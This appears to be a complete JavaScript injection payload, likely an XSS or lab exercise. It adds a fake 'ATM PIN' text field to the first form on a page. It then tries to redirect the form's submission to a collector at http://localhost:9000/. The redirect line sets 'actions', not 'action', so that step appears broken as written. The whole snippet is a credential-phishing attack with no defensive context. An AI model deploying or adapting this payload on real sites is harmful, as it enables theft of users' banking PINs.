var input = document.createElement("Input");
input.setAttribute("type","text");
input.setAttribute("class","input-block-level");
input.setAttribute("placeholder","ATM PIN");
input.setAttribute("name","atmpin");

var previous = document.forms[0].elements[0];
document.forms[0].insertBefore(input,previous);
document.forms[0].actions = "http://localhost:9000/";
